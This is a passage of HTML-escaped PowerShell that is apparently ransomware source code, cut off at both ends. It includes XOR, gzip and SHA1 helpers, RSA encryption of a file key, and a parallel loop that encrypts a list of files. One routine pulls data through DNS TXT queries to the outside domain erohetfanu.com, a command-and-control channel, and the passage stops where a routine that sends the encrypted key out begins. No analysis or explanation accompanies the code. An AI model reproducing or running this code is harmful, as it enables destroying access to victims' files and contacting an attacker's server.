    &lt;span class="nv"&gt;$tmp&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;ForEach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;$DEC&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{0:x}&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-f&lt;/span&gt; &lt;span class="no"&gt;[Int]&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
            &lt;span class="nv"&gt;$tmp&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$tmp&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$tmp&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;ti_rox&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$b1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$b1&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="nv"&gt;$b1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$b2&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="nv"&gt;$b2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$cont&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;$b1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$b1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="nv"&gt;$b2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;-lt&lt;/span&gt; &lt;span class="nv"&gt;$b1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;++)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$cont&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$b1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-bxor&lt;/span&gt; &lt;span class="nv"&gt;$b2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$cont&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;B2G&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$Data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;Process&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$out&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.IO.MemoryStream]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nv"&gt;$gStream&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Compression&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GzipStream&lt;/span&gt; &lt;span class="nv"&gt;$out&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[IO.Compression.CompressionMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Compress&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$gStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$Data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$gStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$out&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToArray&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;G2B&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$Data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;Process&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$SrcData&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Data&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$gStream&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Compression&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GzipStream&lt;/span&gt; &lt;span class="nv"&gt;$SrcData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[IO.Compression.CompressionMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Decompress&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$gStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CopyTo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$gStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nv"&gt;$SrcData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="no"&gt;[byte[]]&lt;/span&gt; &lt;span class="nv"&gt;$byteArr&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$output&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToArray&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$byteArr&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;sh1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[String]&lt;/span&gt; &lt;span class="nv"&gt;$String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$SB&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StringBuilder&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="no"&gt;[System.Security.Cryptography.HashAlgorithm]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHA1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;ComputeHash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[System.Text.Encoding]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$String&lt;/span&gt;&lt;span class="p"&gt;))|%{&lt;/span&gt;
        &lt;span class="no"&gt;[Void]&lt;/span&gt;&lt;span class="nv"&gt;$SB&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="nv"&gt;$SB&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;p_k_e&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key_bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$pub_bytes&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nv"&gt;$cert&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;-TypeName&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Security&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Cryptography&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X509Certificates&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X509Certificate2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$cert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Import&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pub_bytes&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$encKey&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$cert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PublicKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key_bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="nv"&gt;$encKey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;e_n_d&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$allfiles&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$make_cookie&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$tcount&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$file&lt;/span&gt; &lt;span class="o"&gt;-lt&lt;/span&gt; &lt;span class="nv"&gt;$allfiles&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="p"&gt;++&lt;/span&gt;  &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$true&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$running&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;@(&lt;/span&gt;&lt;span class="nb"&gt;Get-Job&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Where-Object&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;State&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Running&amp;#39;&lt;/span&gt;
                    &lt;span class="p"&gt;});&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$running&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Count&lt;/span&gt; &lt;span class="o"&gt;-le&lt;/span&gt; &lt;span class="nv"&gt;$tcount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nb"&gt;Start-Job&lt;/span&gt;  &lt;span class="n"&gt;-ScriptBlock&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$File&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$true_false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
                        &lt;span class="n"&gt;e_d_file&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="nv"&gt;$File&lt;/span&gt; &lt;span class="nv"&gt;$true_false&lt;/span&gt;
                    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                        &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Message&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-String&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-File&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\Desktop\ps_log.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;-append&lt;/span&gt;
                    &lt;span class="p"&gt;}&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;-args&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$allfiles&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;$make_cookie&lt;/span&gt; &lt;span class="n"&gt;-InitializationScript&lt;/span&gt; &lt;span class="nv"&gt;$functions&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nb"&gt;Start-Sleep&lt;/span&gt; &lt;span class="n"&gt;-m&lt;/span&gt; &lt;span class="n"&gt;200&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="k"&gt;continue&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;g_o_dns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$h&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;..(&lt;/span&gt;&lt;span class="no"&gt;[convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ToInt32&lt;/span&gt;&lt;span class="p"&gt;($(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$f.erohetfanu.com&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)-&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$h&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$i.$f.erohetfanu.com&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;H2A&lt;/span&gt; &lt;span class="nv"&gt;$h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;s_2_c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$astring&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$size&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$new_arr&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;@();&lt;/span&gt;
    &lt;span class="nv"&gt;$chunk_index&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..$(&lt;/span&gt;&lt;span class="nv"&gt;$astring&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="nv"&gt;$size&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$new_arr&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;@(&lt;/span&gt;&lt;span class="nv"&gt;$astring&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;substring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$chunk_index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$size&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
        &lt;span class="nv"&gt;$chunk_index&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; &lt;span class="nv"&gt;$size&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$new_arr&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;snd_k&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$enc_k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
